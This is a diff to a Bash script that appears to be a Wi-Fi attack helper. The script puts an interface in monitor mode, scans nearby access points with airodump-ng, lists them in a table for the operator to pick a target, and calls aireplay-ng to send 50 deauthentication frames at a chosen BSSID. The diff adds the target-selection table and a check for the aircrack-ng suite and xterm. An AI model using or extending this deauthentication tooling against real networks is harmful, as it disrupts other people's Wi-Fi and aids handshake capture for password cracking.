@@ -2,6 +2,7 @@
 # 
 #
 # colors
+BLUE='\033[0;34m'
 RED='\033[0;31m'
 GREEN='\033[0;32m'
 YELLOW='\033[0;33m'
@@ -46,6 +47,7 @@ filter_info() {
     cat ap_info.csv | awk -F ',' '/,,,/{p++} p==1 && NF>1' | sed '1,2d; s/,,,,//g' | sort -u >> final_result.txt
     rm ap_info.csv
     rm outputfile-01.csv
+    choseTargetAp final_result.txt
 }
 # # filter_info() {
 #     local input_file=$1
@@ -61,6 +63,47 @@ sendDeauth () {
   aireplay-ng --deauth 50 -a $bassid $interface
 }
 
+# Function to print table headers
+
+choseTargetAp () {
+   # Read input line by line from the file
+    local input_file=$1
+    # Parse the file using awk to handle variable lines and print in tabular format
+    awk -F ", " '
+        BEGIN {
+            # Set column widths and print top border
+            printf "+------+-------------------+--------+--------------------+------------+------------+\n"
+            # Print header
+            printf "| %-4s | %-17s | %-6s | %-18s | %-10s | %-10s |\n", "Line", "MAC Address", "Channel", "ESSID", "Security", "Encryption"
+            # Print divider
+            printf "+------+-------------------+--------+--------------------+------------+------------+\n"
+            line=0
+        }
+        {
+            line++
+            # Print each field with proper formatting
+            printf "| %-4s | %-17s | %-6s | %-18s | %-10s | %-10s |\n", line, $1, $2, $3, $4, $5
+        }
+        END {
+            # Print bottom borderls
+            printf "+------+-------------------+--------+--------------------+------------+------------+\n"
+        }' "$input_file"
+    total_lines=$(wc -l < "$input_file")
+    while true; do
+        if [ "$ragetAp" == "1" ]; then
+            break        
+        else
+            read -p "> Enter the Target Ap :" targetAp 2> /dev/null
+            if [ "$targetAp" -gt 0 ] && [ "$targetAp" -le "$total_lines" ]; then
+                echo "Congratulation"
+                break
+            else 
+                echo "Error"
+            fi
+        fi
+    done
+
+}
 
 check_monitor_mode_support() {
     # Check if the phy80211 directory exists for the interface
@@ -72,7 +115,7 @@ check_monitor_mode_support() {
             echo -e "${GREEN}[+]~:${NC} You on ready in Monitro Mode !"
             checkTools
         else
-            read -p "      Switch ($interface) to monitor mode (yes/no) : " response
+            read -p "${GREEN}[+] ${NC}Switch ($interface) to monitor mode (y/n) >  " response
             if [ "$response" == "yes" ] || [ "$response" == "y" ]; then
                 sleep .7
                 airmon-ng start $interface >> /dev/null
@@ -126,16 +169,31 @@ checkRoot () {
         check_monitor_mode_support
     fi
 } 
-checkTools () {
+
+
+checkTools() {
     echo -e "${GREEN}[+]~:${NC} Tools checking~:"
-    air=$(which aircrack-ng)
-    if ! [ "$?" -eq "0" ]; then
-      echo -e "     Aircrack-ng     ${RED}[Not Found] ${NC}"
-      echo "[!] try [ apt-get install aircrack-ng ] " 
-      exit 1
-    else 
-      echo -e "      Aircrack-ng            :${GREEN}[Found]${NC}"
-      run_airodump $interface
+    tools=("aircrack-ng" "airodump-ng" "aireplay-ng" "xterm")
+    tools_found=0
+    for tool in "${tools[@]}"; do
+        tool_path=$(which "$tool")
+        if [ "$?" -ne "0" ]; then
+            echo -e "$tool  :${RED}[Not Found] ${NC}"
+            echo "[!] try [ apt-get install $tool ] "
+        else 
+            sleep 0.4
+            echo -e "${BLUE}[+] ${NC}$tool ${GREEN}[Found]${NC}"
+            ((tools_found+=1)) # Increment the counter if the tool is found
+        fi
+    done
+    if [ "$tools_found" -eq "${#tools[@]}" ]; then
+        run_airodump $interface
+    else
+        echo -e "${RED}Some required tools were not found.${NC}"
+        exit 1
     fi
 }
+
+
+
 checkRoot
